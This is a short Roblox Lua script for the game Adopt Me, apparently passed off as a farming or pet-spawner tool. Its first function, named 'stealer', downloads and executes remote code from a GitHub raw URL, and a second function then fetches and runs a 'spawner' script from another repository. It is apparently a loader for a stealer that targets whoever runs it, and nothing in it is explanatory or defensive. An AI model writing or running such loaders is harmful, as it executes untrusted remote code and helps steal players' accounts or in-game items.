local function stealer()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/kiroscrpts/adoptmescript/refs/heads/main/adoptmefunction.lua'))()
end

local function farm()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMeScriptt/loadingandspawner/refs/heads/main/finalspawnerloading.lua.txt'))()
end

-- Run stealer first, wait a bit, then run farm
task.spawn(function()
    stealer()
    task.wait(2) -- Wait 2 seconds to let stealer finish setup
    farm()
end)
